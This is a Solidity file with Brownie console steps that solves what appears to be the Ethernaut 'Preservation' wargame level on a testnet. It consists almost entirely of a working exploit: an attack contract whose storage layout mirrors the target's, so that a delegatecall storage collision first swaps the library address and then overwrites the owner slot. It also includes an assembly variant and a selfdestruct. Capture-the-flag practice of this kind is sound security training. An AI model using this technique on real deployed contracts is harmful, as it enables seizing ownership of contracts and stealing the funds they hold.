/* 

In this challenge, delegatecalls updates the Preservation contract state variables


# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# Deploy the attack contract and save the address

attack_contract = PreservationAttack.deploy({'from': a[0]})

# call setSecondTime with input as your Attack contract address(converted to integer). it will set timeZone1Library to your attack contract address

pre_contract = interface.Preservation.at("PreservationContractAddress")
  
contractAddressAsInteger = web3.toInt(hexstr=attack_contract.address)  converts attack contract address to Integer

pre_contract.setSecondTime(contractAddressAsInteger,{'from': a[0]})

# call setFirstTime. it will call your attack contract which will update owner to your address

pre_contract.setFirstTime(1,{'from': a[0]}

# confirm owner at storage location 2 

# submit 

# (OPTIONAL) call destroy()

*/


//SPDX-License-Identifier: MIT

pragma solidity 0.8.6;


interface Preservation {

  function setFirstTime(uint _timeStamp) external;
  function setSecondTime(uint _timeStamp) external;
}


contract PreservationAttack {

address placeholder;
address placeholder2;
address public owner;


function setTime(uint _time) public {

    owner = msg.sender; 

    /* or without using the state variables , just update the 3rd storage variable using inline assembly

    assembly {
      sstore(2,caller())
      }
  
    */
}

function destroy() external {

  selfdestruct(payable(msg.sender));
  }
}
